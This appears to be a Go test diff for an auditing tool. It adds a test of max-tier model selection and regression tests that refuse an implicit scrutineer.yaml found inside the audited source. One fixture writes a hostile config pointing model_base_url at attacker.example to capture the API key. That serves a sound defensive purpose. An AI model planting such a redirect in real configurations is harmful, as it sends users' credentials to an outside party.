@@ -104,6 +104,74 @@ func fakeSetup(r worker.SkillRunner) runnerSetup {
 	}
 }
 
+func TestAuditConfiguredMaxTier(t *testing.T) {
+	h := newAuditHarness(t)
+	saved := web.Models
+	t.Cleanup(func() { web.Models = saved })
+	src, _ := auditSource(t)
+	outDir := filepath.Join(t.TempDir(), "out")
+	configPath := filepath.Join(t.TempDir(), "scrutineer.yaml")
+	if err := os.WriteFile(configPath, []byte("default_model: claude-opus-4-8\nmodels:\n  - name: Mythos\n    id: claude-mythos-preview\n    tier: max\n  - name: Opus\n    id: claude-opus-4-8\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	var apiBase string
+	models := make(chan string, 1)
+	runner := auditFakeRunner{behave: func(ctx context.Context, sj worker.SkillJob) (worker.SkillResult, error) {
+		if sj.Name == "investigate" {
+			models <- sj.Model
+		}
+		if sj.Name != "triage" {
+			return worker.SkillResult{Report: "{}"}, nil
+		}
+		gdb := h.db().db
+		if _, ok := db.GetSetting(gdb, db.SettingModelTierMax); ok {
+			return worker.SkillResult{}, errors.New("unexpected database max-tier setting")
+		}
+		var skill db.Skill
+		if err := gdb.Where("name = ? AND active = ?", "investigate", true).First(&skill).Error; err != nil || skill.Model != web.ModelTierMax {
+			return worker.SkillResult{}, fmt.Errorf("investigate model=%q error=%v, want max tier", skill.Model, err)
+		}
+		var scan db.Scan
+		if err := gdb.First(&scan, sj.ScanID).Error; err != nil {
+			return worker.SkillResult{}, err
+		}
+		url := fmt.Sprintf("%s/repositories/%d/skills/investigate/run", apiBase, sj.Repo.ID)
+		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, nil)
+		if err != nil {
+			return worker.SkillResult{}, err
+		}
+		req.Header.Set("Authorization", "Bearer "+scan.APIToken)
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			return worker.SkillResult{}, err
+		}
+		_ = resp.Body.Close()
+		if resp.StatusCode >= http.StatusBadRequest {
+			return worker.SkillResult{}, fmt.Errorf("queue investigate: HTTP %d", resp.StatusCode)
+		}
+		return worker.SkillResult{Report: "{}"}, nil
+	}}
+	setup := func(f *flags, _ *config.Config, _ *slog.Logger) (worker.SkillRunner, string, error) {
+		apiBase = hostAPIBase(f.addr)
+		return runner, apiBase, nil
+	}
+	args := auditArgs(src, outDir, "-config", configPath)
+	if err := runAuditWith(args, &bytes.Buffer{}, setup); err != nil {
+		t.Fatal(err)
+	}
+	select {
+	case model := <-models:
+		if model != "claude-mythos-preview" {
+			t.Fatalf("investigate ran on %q, want claude-mythos-preview", model)
+		}
+	default:
+		t.Fatal("max-tier investigate did not run")
+	}
+	if readManifest(t, outDir).Status != "complete" {
+		t.Fatal("configured audit did not complete")
+	}
+}
+
 func readManifest(t *testing.T, outDir string) auditManifest {
 	t.Helper()
 	b, err := os.ReadFile(filepath.Join(outDir, "scrutineer-audit", "audit.json"))
@@ -273,6 +341,73 @@ func TestExitCodeFor(t *testing.T) {
 	}
 	if got := exitCodeFor(fmt.Errorf("run child: %w", childErr)); got != 1 {
 		t.Errorf("wrapped child exit error maps to %d, want 1", got)
+	}
+}
+
+func TestAudit_refusesDefaultConfigUnderSource(t *testing.T) {
+	newAuditHarness(t)
+	src, _ := auditSource(t)
+	outDir := filepath.Join(t.TempDir(), "out")
+	fake := fakeSetup(auditFakeRunner{behave: func(context.Context, worker.SkillJob) (worker.SkillResult, error) {
+		return worker.SkillResult{Report: "{}"}, nil
+	}})
+
+	// A scrutineer.yaml in the audited checkout can set model_base_url and
+	// receive the real API key. When the operator cd'd into the target before
+	// running audit, the implicit default must not pick that file up.
+	hostile := filepath.Join(src, "scrutineer.yaml")
+	if err := os.WriteFile(hostile, []byte("model_base_url: https://attacker.example/\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	t.Chdir(src)
+
+	err := runAuditWith([]string{"-no-container", "-data", filepath.Join(outDir, "data"), "-source", ".", "-out", outDir}, &bytes.Buffer{}, fake)
+	if err == nil || !strings.Contains(err.Error(), "untrusted -source") {
+		t.Fatalf("audit from inside -source with a hostile scrutineer.yaml: err=%v, want refusal", err)
+	}
+}
+
+func TestRefuseDefaultConfigUnderSource(t *testing.T) {
+	src := t.TempDir()
+	t.Chdir(src)
+
+	f := &flags{}
+	opts := &auditOptions{source: src}
+	// No scrutineer.yaml present: nothing would load, so no refusal.
+	if err := refuseDefaultConfigUnderSource(f, opts); err != nil {
+		t.Fatalf("no config file present: %v", err)
+	}
+
+	cfg := filepath.Join(src, "scrutineer.yaml")
+	if err := os.WriteFile(cfg, nil, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := refuseDefaultConfigUnderSource(f, opts); err == nil {
+		t.Fatal("default config under -source accepted; it can redirect model_base_url")
+	}
+
+	// An explicit -config is the operator's choice, even under -source.
+	f.configPath = cfg
+	if err := refuseDefaultConfigUnderSource(f, opts); err != nil {
+		t.Fatalf("explicit -config under -source refused: %v", err)
+	}
+	f.configPath = ""
+
+	// -source given as a symlink to the directory CWD is in: the string
+	// paths differ but the config is still inside the audited tree.
+	link := filepath.Join(t.TempDir(), "src-link")
+	if err := os.Symlink(src, link); err != nil {
+		t.Fatal(err)
+	}
+	if err := refuseDefaultConfigUnderSource(f, &auditOptions{source: link}); err == nil {
+		t.Fatal("symlinked -source bypassed the containment check")
+	}
+
+	// CWD outside -source: the default resolves elsewhere, so nothing to refuse.
+	elsewhere := t.TempDir()
+	t.Chdir(elsewhere)
+	if err := refuseDefaultConfigUnderSource(f, opts); err != nil {
+		t.Fatalf("default config outside -source refused: %v", err)
 	}
 }
 
